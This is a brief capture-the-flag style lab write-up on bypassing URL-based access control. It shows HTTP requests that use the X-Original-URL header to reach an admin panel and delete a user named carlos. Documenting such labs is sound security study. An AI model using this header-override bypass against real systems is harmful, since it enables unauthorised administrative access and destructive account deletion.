# Lab: URL-based access control can be circumvented

First we need to change the request to get the admin panel with:
From:
```http
GET /admin HTTP/1.1
...
```
To:
```http
GET / HTTP/1.1
.....
X-Original-URL: /admin
```

Next we need to delte the user carlos with the request:
```http
GET /admin/delete?username=carlos HTTP/1.1
...
Connection: close
```
This will not work without the X-Original-URL header:
```http
GET /?username=carlos HTTP/1.1
...
X-Original-URL: /admin/delete?username=carlos
```




